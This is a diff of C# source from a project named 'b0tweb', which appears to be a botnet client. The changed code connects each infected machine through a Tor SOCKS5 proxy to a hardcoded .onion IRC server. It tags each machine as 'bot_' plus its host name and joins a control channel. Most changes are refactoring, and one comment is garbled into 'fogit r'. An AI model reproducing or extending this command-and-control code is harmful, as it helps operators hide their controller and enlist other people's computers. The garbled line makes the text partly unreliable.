@@ -20,27 +20,27 @@ namespace b0tweb
         /// <summary>
         /// The Tor server to connect to.
         /// </summary>
-        private const string _server = "botwebzoqpduhxj7hgbu2f6vooyj3lt3q6f6lxir7wb7xjilmvbzkzid.onion";
+        private const string Server = "botwebzoqpduhxj7hgbu2f6vooyj3lt3q6f6lxir7wb7xjilmvbzkzid.onion";
 
         /// <summary>
-        /// The IRC port to use for the connection.
+        /// The IRC port to use fogit r the connection.
         /// </summary>
-        private const int _port = 6667;
+        private const int Port = 6667;
 
         /// <summary>
         /// The proxy host address of the Tor proxy server.
         /// </summary>
-        private const string _proxyHost = "localhost";
+        private const string ProxyHost = "localhost";
 
         /// <summary>
         /// The proxy host port of the Tor proxy server.
         /// </summary>
-        private const int _proxyPort = 9150;
+        private const int ProxyPort = 9050;
 
         /// <summary>
         /// The proxy type of the Tor proxy server.
         /// </summary>
-        private const ProxyType _proxyType = ProxyType.Socks5;
+        private const ProxyType ProxyKind = ProxyType.Socks5;
 
         /// <summary>
         /// The Nickname of the client.
@@ -59,12 +59,12 @@ namespace b0tweb
         {
             Random rand = new Random();
             this._irc = new IrcClient();
-            this._nick = "bot_" + System.Environment.MachineName + "_" + rand.Next(0, 1000).ToString();
+            this._nick = "bot_" + Environment.MachineName + "_" + rand.Next(0, 1000).ToString();
             this._realName = this._nick + "_real";
 
-            this._irc.ProxyHost = IRCConnectionController._proxyHost;
-            this._irc.ProxyPort = IRCConnectionController._proxyPort;
-            this._irc.ProxyType = IRCConnectionController._proxyType;
+            this._irc.ProxyHost = IRCConnectionController.ProxyHost;
+            this._irc.ProxyPort = IRCConnectionController.ProxyPort;
+            this._irc.ProxyType = IRCConnectionController.ProxyKind;
         }
 
         /// <summary>
@@ -75,6 +75,17 @@ namespace b0tweb
             get
             {
                 return this._nick;
+            }
+        }
+
+        /// <summary>
+        /// Gets the IRC real name for this client.
+        /// </summary>
+        public String RealName
+        {
+            get
+            {
+                return this._realName;
             }
         }
 
@@ -93,8 +104,8 @@ namespace b0tweb
         /// <param name="channel">The channel to join.</param>
         public void Join(string channel)
         {
-            this._irc.Connect(_server, _port);
-            this._irc.Login(_nick, _realName);
+            this._irc.Connect(IRCConnectionController.Server, IRCConnectionController.Port);
+            this._irc.Login(this._nick, this._realName);
             this._irc.RfcJoin(channel);
         }
 
